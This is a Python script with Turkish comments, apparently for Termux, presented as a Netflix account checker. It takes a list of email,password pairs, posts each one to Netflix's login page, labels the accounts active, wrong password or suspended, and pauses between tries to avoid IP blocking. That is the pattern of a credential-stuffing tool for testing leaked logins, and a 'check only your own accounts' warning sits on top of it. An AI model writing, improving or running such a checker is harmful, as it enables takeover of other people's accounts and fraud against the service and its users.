import requests
from time import sleep

def check_netflix_account(email, password):
    """
    Netflix hesap kontrolü (SIMÜLE EDİLMİŞ, RESMİ API DEĞİL)
    """
    # Netflix login sayfasını simüle eden bir istek (gerçek API değil)
    url = "https://www.netflix.com/login"  # Gerçek giriş sayfası (API değil)
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; Termux) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
    }
    
    data = {
        "userLoginId": email,
        "password": password,
    }
    
    try:
        response = requests.post(url, headers=headers, data=data, allow_redirects=False)
        
        # Netflix'in yönlendirme davranışına göre kontrol
        if response.status_code == 302 and "profiles" in response.headers.get("Location", ""):
            return "✅ **Aktif** (Giriş başarılı)"
        elif response.status_code == 200 and "Incorrect password" in response.text:
            return "❌ **Şifre Hatalı**"
        elif response.status_code == 403:
            return "🔒 **Hesap Askıda** (Too many attempts)"
        else:
            return "⚠️ **Bilinmeyen Yanıt** (Netflix güvenlik önlemi)"
    
    except requests.exceptions.RequestException as e:
        return f"⛔ **Ağ Hatası**: {str(e)}"

def main():
    print("\n🔐 Netflix Hesap Kontrol Aracı (Termux)")
    print("⚠️ SADECE KENDİ HESAPLARINIZI KONTROL EDİN!")
    
    accounts = []
    print("\n📥 E-posta ve şifreleri girin (format: email,şifre). Bitirmek için 'done' yazın.")
    
    while True:
        user_input = input("> ").strip()
        if user_input.lower() == "done":
            break
        if "," in user_input:
            email, password = user_input.split(",", 1)
            accounts.append((email.strip(), password.strip()))
        else:
            print("❌ Geçersiz format! 'email,şifre' şeklinde girin.")
    
    print("\n🔍 Kontrol ediliyor...\n")
    
    for email, password in accounts:
        print(f"📧 {email} → ", end="", flush=True)
        result = check_netflix_account(email, password)
        print(result)
        sleep(2)  # Netflix'in IP engellemesini önlemek için bekle
    
    print("\n✅ İşlem tamamlandı!")

if __name__ == "__main__":
    main()